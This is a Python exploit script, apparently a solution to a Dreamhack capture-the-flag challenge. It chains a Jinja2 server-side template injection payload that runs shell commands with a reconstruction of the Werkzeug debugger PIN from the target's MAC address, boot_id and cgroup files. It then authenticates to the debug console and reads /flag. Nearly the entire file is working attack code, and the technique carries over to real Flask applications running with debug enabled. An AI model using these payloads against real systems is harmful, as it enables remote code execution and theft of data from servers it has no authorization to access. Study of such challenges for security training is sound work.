import requests
from itertools import chain
import hashlib
import requests
import sys
import re
import urllib

URL = "http://host1.dreamhack.games:14841/"

def ssti(cmd):
    res = requests.get(f"{URL}%7B%7B%20''.__class__.__mro__[1].__subclasses__()[398](%22{cmd}%22,shell=True,stdout=-1).communicate()%20%7D%7D")
    return res.text

def secret():
    s = ssti("curl localhost:8000/console")
    s_ = re.findall("[0-9a-zA-Z]{20}",s)
    return s_[0]

def get_uuid_node():
    u = ssti("cat /sys/class/net/eth0/address")
    u_ = re.search(r"([0-9a-fA-F]{2}(:[0-9a-fA-F]{2}){5})", u)
    u1 = u_.group(1)
    return int(u1.replace(":", ""), 16)

def get_machine_id():
    t = ssti("cat /proc/sys/kernel/random/boot_id").split("(b&#39;")[1].split("\\n")[0]
    t1 = ssti("cat /proc/self/cgroup").split("/")[2].split("\\n")[0]
    #match = re.search(r"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}", t)
    #match = t.split("(b&#39;")[1].split("\\n")[0]
    return t + t1

def generate_pin():
    probably_public_bits = [
        'root',
        'flask.app',
        'Flask',
        '/usr/local/lib/python3.8/site-packages/flask/app.py',
    ]
    
    private_bits = [str(get_uuid_node()), get_machine_id()] 

    rv = None
    num = None

    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode()
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = f"__wzd{h.hexdigest()[:20]}"

    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num
    return rv

#def pinauth():
    #res = ssti(f"curl%20-G%20-i%20localhost:8000/console%20--data-urlencode%20__debugger__=yes%20--data-urlencode%20s={secret()}%20--data-urlencode%20frm=0%20--data-urlencode%20cmd=pinauth%20--data-urlencode%20pin={generate_pin()}")
    #return re.findall(r"__wzd\S*[^\W]",res)[0]

#def get_flag():
    #print("p : " + pinauth())
    #print("s : " + secret())
    #res = ssti(f"curl%20-G%20-b%20'{pinauth()}'%20-i%20localhost:8000/console%20--data-urlencode%20__debugger__=yes%20--data-urlencode%20s={secret()}%20--data-urlencode%20frm=0%20--data-urlencode%20'''cmd=__import__(%5C%22os%5C%22).popen(%5C%22cat%20%2Fflag%5C%22).read();'''")
    #return re.findall(r"BISC\{.*?\}",res)[0]

def get_flag():
    s = secret()
    p = generate_pin()
    pin_auth = ssti(f"curl%20-G%20-i%20localhost:8000/console%20--data-urlencode%20__debugger__=yes%20--data-urlencode%20s={s}%20--data-urlencode%20frm=0%20--data-urlencode%20cmd=pinauth%20--data-urlencode%20pin={p}")
    auth_cookie = re.findall(r"__wzd\S*[^\W]",pin_auth)[0]
    get_ = ssti(f"curl%20-G%20-b%20'{auth_cookie}'%20-i%20localhost:8000/console%20--data-urlencode%20__debugger__=yes%20--data-urlencode%20s={s}%20--data-urlencode%20frm=0%20--data-urlencode%20'''cmd=__import__(%5C%22os%5C%22).popen(%5C%22cat%20%2Fflag%5C%22).read();'''")
    
    return re.findall(r"BISC\{.*?\}",get_)[0]

print("FLAG : " + get_flag())
